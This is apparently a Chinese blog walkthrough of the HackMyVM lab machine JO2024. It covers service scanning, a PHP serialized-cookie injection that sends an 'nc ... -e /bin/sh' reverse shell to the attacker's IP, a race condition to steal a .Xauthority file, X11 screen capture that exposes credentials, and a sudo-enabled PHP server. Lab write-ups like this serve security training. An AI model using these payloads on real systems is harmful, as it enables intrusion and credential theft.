---
title: HMV JO2024
published: 2025-03-07
pinned: false
description: HMV JO2024，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-07
pubDate: 2025-03-07
---

## JO2024
### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=JO2024


### 日常扫描

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:1c:42:fd:ba:b5, IPv4: 192.168.31.187
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.106  08:00:27:91:df:4a       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
192.168.31.210  f4:6d:3f:27:e6:fb       (Unknown)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.841 seconds (139.05 hosts/sec). 4 responded
                                                                             
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ nmap -sC -sV 192.168.31.106 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 16:22 CST
Nmap scan report for 192.168.31.106 
Host is up (0.0039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Paris 2024 Olympic Games
|_http-server-header: Apache/2.4.61 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
                                                                
```

网页没有什么危险信息，轻微爆破一下目录
```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ dirb http://192.168.31.106 /

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar  7 16:26:54 2025
URL_BASE: http://192.168.31.106 /
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.31.106 / ----
                                                                                                                                                          ==> DIRECTORY: http://192.168.31.106 /img/
+ http://192.168.31.106 /index.php (CODE:200|SIZE:7812)                     
+ http://192.168.31.106 /server-status (CODE:403|SIZE:280)                  
                                                                            
---- Entering directory: http://192.168.31.106 /img/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Mar  7 16:26:58 2025
DOWNLOADED: 4612 - FOUND: 2

```

`/img`目录不知道干啥的，看看，就是个放照片的，深度扫描一下
```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ dirsearch -u "http://192.168.31.106 /" -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                             
 (_||| _) (/_(_|| (_| )                                                      
                                                                             
Extensions: php, zip, txt | HTTP method: GET | Threads: 25
Wordlist size: 10439

Output File: /home/parallels/reports/http_192.168.31.106 /__25-03-07_16-29-03.txt

Target: http://192.168.31.106 /

[16:29:03] Starting:                                                         
[16:29:11] 301 -  316B  - /img  ->  http://192.168.31.106 /img/             

Task Completed                                                               
                                             
```
还是这样，我还有一计

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ gobuster dir -u 192.168.31.106  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.31.106 
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 7812]
/img                  (Status: 301) [Size: 316] [--> http://192.168.31.106 /img/]                                                                         
/preferences.php      (Status: 200) [Size: 3163]
/.php                 (Status: 403) [Size: 280]

```
哎，`/preferences.php `刚才是没有的，访问页面看见
```
No user preferences were found or the cookie has expired. Please check your cookie settings or contact the site administrator if the problem persists
```
哎，提醒我们有cookie，bp启动

### 弹shell

```
GET /preferences.php HTTP/1.1
Host: 192.168.31.106 
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ%3D%3D
Upgrade-Insecure-Requests: 1

```

`cookie`里面有`preferences`,这玩意其实是base64，没想到吧
```
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";}
```
看着像是序列化的东西，不确定，再试试，修改成`O:15:"UserPreferences":2:{s:8:"language";s:6:"whoami";s:15:"backgroundColor";s:7:"#DC143C";}`然后base64发过去，会得到`Your language setting is whoami.`
ok，无敌了
`O:15:"UserPreferences":2:{s:8:"language";s:33:"nc 192.168.31.187 1234 -e /bin/sh";s:15:"backgroundColor";s:4:"#ddd";}`
(注意点：s：后面的数字是字符串的长度,echo -n "nc 192.168.31.187 1234 -e /bin/sh" | wc -c是输出33)

这个时候就反弹shell成功了


### 提权

先`python3 -c 'import pty; pty.spawn("/bin/bash")'`升级一下shell

```
www-data@MiWiFi-R4CM-srv:/home/vanity$ ls -la
ls -la
total 76
drwxr-xr-x 10 vanity vanity 4096 Mar  7 12:44 .
drwxr-xr-x  3 root   root   4096 Jul 28  2024 ..
-rw-------  1 vanity vanity  218 Mar  7 12:43 .Xauthority
lrwxrwxrwx  1 root   root      9 Jul 26  2024 .bash_history -> /dev/null
-rw-r--r--  1 vanity vanity  220 Jul 29  2024 .bash_logout
-rw-r--r--  1 vanity vanity 3526 Jul 29  2024 .bashrc
drwxr-xr-x  7 vanity vanity 4096 Jul 29  2024 .cache
drwx------ 13 vanity vanity 4096 Jul 29  2024 .config
-rw-r--r--  1 vanity vanity   35 Jul 29  2024 .dmrc
-rw-------  1 vanity vanity   36 Jul 29  2024 .lesshst
drwxr-xr-x  3 vanity vanity 4096 Jul 29  2024 .local
-rw-r--r--  1 vanity vanity  807 Jul 29  2024 .profile
drwx------  2 vanity vanity 4096 Jul 29  2024 .ssh
-rw-r--r--  1 vanity vanity    8 Jul 29  2024 .xprofile
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Desktop
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Documents
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Images
-rwxr-xr-x  1 vanity vanity  557 Jul 29  2024 backup
drwx------  2 vanity vanity 4096 Jul 29  2024 creds
-rwx------  1 vanity vanity   33 Jul 29  2024 user.txt

```

flag不让读wc，backup可以，看看

```
www-data@MiWiFi-R4CM-srv:/home/vanity$ cat backup
cat backup
#!/bin/bash

SRC="/home/vanity"
DEST="/backup"

rm -rf /backup/{*,.*}

echo "Starting copy..."
find "$SRC" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do
    destfile="$DEST${srcfile#$SRC}"
    mkdir -p "$(dirname "$destfile")"
    dd if="$srcfile" of="$destfile" bs=4M

    md5src=$(md5sum "$srcfile" | cut -d ' ' -f1)
    md5dest=$(md5sum "$destfile" | cut -d ' ' -f1)
    if [[ "$md5src" != "$md5dest" ]]; then
        echo "MD5 mismatch for $srcfile :("
    fi
    chmod 700 "$destfile"

done


echo "Copy complete. All files verified !"

```

这个脚本的主要功能是：
1. 清空目标目录 /backup。
2. 将 /home/vanity 目录中除了 user.txt 之外的所有文件复制到 /backup。
3. 在复制过程中，校验文件的完整性，并设置目标文件的权限为 700。
4. 如果文件复制后校验失败，输出错误信息。

漏洞点应该是在于`dd`命令，`dd`复制文件时不会保留原始文件的权限，而是使用目标文件的默认权限，并且可以是看到是在复制完毕后再使用`chmod 700 "$destfile"`去设置权限

我们目的是读取文件，那么我们就可以使用条件竞争在它修改文件权限前读到文件

```
www-data@jo2024:/$ while true; do cat /backup/.Xauthority >> /tmp/log 2>/dev/null;sleep 0.01; done
<Xauthority >> /tmp/log 2>/dev/null;sleep 0.01; done
```

看看`log`
```
www-data@jo2024:/$ cat /tmp/log
cat /tmp/log
debian11MIT-MAGIC-COOKIE-1>7
EXJ[fdebian0MIT-MAGIC-COOKIE-1mlJ

jo2024.hmv0MIT-MAGIC-COOKIE-1A6&Xj*Zdebian11MIT-MAGIC-COOKIE-1>7
```

利用 .Xauthority，在https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing

```
www-data@jo2024:/$ w
 14:03:43 up  4:43,  1 user,  load average: 0.44, 0.29, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vanity   tty7     :0               09:20    4:43m  0.00s  0.07s /usr/bin/lxsession -s LXDE -e LXDE

export XAUTHORITY=/tmp/log

xwd -root -screen -silent -display :0 > screenshot.xwd

python3 -m http.server 2131(传到kali)

convert screenshot.xwd screenshot.png
```
得到账号密码vanity/xd0oITR93KIQDbiD，那么ssh上去

```
vanity@MiWiFi-R4CM-srv:~$ sudo -l
sudo: unable to resolve host MiWiFi-R4CM-srv: No address associated with hostname
Matching Defaults entries for vanity on MiWiFi-R4CM-srv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User vanity may run the following commands on MiWiFi-R4CM-srv:
    (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh

vanity@MiWiFi-R4CM-srv:~$ cat /usr/local/bin/php-server.sh
#!/bin/bash

/usr/bin/php -t /opt -S 0.0.0.0:8000

```

好像是起了一个服务，启动访问一下
```
Olympic Athlete Password Leaked!
A hacker claims to have obtained the password of a famous Olympic athlete. According to the hacker, he managed to hack into the personal account of the famous sprinter, Usain Bolt!

The hacker has provided what he claims to be Usain Bolt's account password as proof of his achievement. For security reasons and to protect the athlete's privacy, the content below is blurred and requires a subscription to be revealed.

奥运会运动员密码泄漏了！

一位黑客声称已经获得了著名奥运会运动员的密码。根据黑客的说法，他设法闯入了著名的短跑运动员Usain Bolt的个人帐户！

黑客提供了他声称是Usain Bolt的帐户密码的证明，以证明他的成就。出于安全原因并保护运动员的隐私，下面的内容模糊不清，需要订阅以揭示。
```
f12看看隐藏的部分
```
data-content="As part of a recent cyber attack, we managed to access Usain Bolt's personal account. The password associated with his account is <strong>LightningBolt123</strong>. This breach demonstrates the vulnerabilities of even the most secure systems."
```
gameover咯